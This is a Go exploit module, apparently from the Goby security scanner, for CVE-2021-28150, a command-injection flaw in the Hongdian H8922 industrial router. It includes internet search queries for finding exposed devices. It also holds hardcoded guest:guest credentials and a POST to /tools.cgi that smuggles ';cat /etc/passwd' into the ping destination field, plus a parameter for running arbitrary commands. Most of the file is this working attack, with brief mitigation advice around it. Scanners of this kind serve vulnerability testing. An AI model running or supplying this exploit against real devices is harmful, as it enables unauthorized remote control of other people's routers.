package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Hongdian H8922 RCE (CVE-2021-28150)",
    "Description": "There is a command execution vulnerability in the network test module in the background of Hongdian H8922. You can log in to the background through the guest user.Execute arbitrary commands through command concatenation.",
    "Impact": "Hongdian H8922 RCE (CVE-2021-28150)",
    "Recommendation": "<p>The official has not fixed this vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.hongdian.com/\">https://www.hongdian .com/</a></p><p/><p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system. </p>",
    "Product": "Hongdian H8922",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Hongdian H8922 路由器 tools.cgi 文件 op_type 参数 后台命令执行漏洞（CVE-2021-28150）",
            "Description": "<p>宏电 H8922 工业路由器是一款功能丰富、应用广泛的工业级VPN路由器。</p><p>宏电 H8922 后台网络测试模块存在命令执行漏洞。攻击者可以通过guest用户登录后台，通过命令串联执行任意命令、写入后门，获取服务器权限，进而控制整个web服务器。。</p>",
            "Impact": "<p>宏电 H8922 后台网络测试模块存在命令执行漏洞。攻击者可以通过guest用户登录后台，通过命令串联执行任意命令、写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.hongdian.com/\" target=\"_blank\">https://www.hongdian.com/</a></p><p><br></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "Hongdian H8922",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Hongdian H8922 RCE (CVE-2021-28150)",
            "Description": "There is a command execution vulnerability in the network test module in the background of Hongdian H8922. You can log in to the background through the guest user.Execute arbitrary commands through command concatenation.",
            "Impact": "Hongdian H8922 RCE (CVE-2021-28150)",
            "Recommendation": "<p>The official has not fixed this vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.hongdian.com/\" target=\"_blank\">https://www.hongdian .com/</a></p><p><br></p><p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system. </p>",
            "Product": "Hongdian H8922",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"3G/4G Router\" && body=\"check_tacacs\"",
    "GobyQuery": "title=\"3G/4G Router\" && body=\"check_tacacs\"",
    "Author": "gobysec@gmail.com",
    "Homepage": "https://gobies.org/",
    "DisclosureDate": "2021-06-18",
    "References": [
        "https://www.linuxlz.com/aqld/2190.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2021-28150"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202105-280"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {
                    "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "3G/4G Router",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/tools.cgi",
                "follow_redirect": false,
                "header": {
                    "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q=",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "op_type=ping&destination=;cat /etc/passwd&user_options="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {
                    "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "3G/4G Router",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/tools.cgi",
                "follow_redirect": false,
                "header": {
                    "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q=",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "op_type=ping&destination=;cat /etc/passwd&user_options="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
